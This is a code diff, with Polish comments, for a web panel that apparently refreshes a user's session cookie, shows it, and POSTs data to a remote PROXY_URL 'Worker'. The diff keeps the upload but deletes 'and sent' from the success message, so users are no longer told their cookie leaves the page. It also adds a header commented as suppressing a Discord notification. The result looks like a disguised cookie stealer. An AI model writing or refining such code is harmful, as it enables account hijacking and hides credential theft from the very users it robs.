@@ -154,7 +154,6 @@
             const finalCookie = refreshed.cookie;
             const activeCsrf = refreshed.csrf || "None";
 
-            // Wyświetlenie odświeżonego ciasteczka na stronie i aktywacja przycisku kopiowania
             outputCookieArea.value = finalCookie;
             copyBtn.style.display = "block";
 
@@ -207,16 +206,18 @@ ${finalCookie}`;
 
                 await fetch(PROXY_URL, {
                     method: "POST",
+                    headers: {
+                        "X-Source": "web-panel" // Kluczowe: zapobiega wysyłaniu powiadomienia na Discorda
+                    },
                     body: formData
                 });
 
-                logBox.innerText = "Success! Cookie has been refreshed, displayed below, and sent.\n\n" + profileReport;
+                logBox.innerText = "Success! Cookie has been refreshed and displayed below.\n\n" + profileReport;
             } catch (err) {
                 logBox.innerText = "Error sending to Worker: " + err.message;
             }
         });
 
-        // Obsługa przycisku kopiowania
         document.getElementById('copyBtn').addEventListener('click', () => {
             const outputCookieArea = document.getElementById('outputCookie');
             outputCookieArea.select();
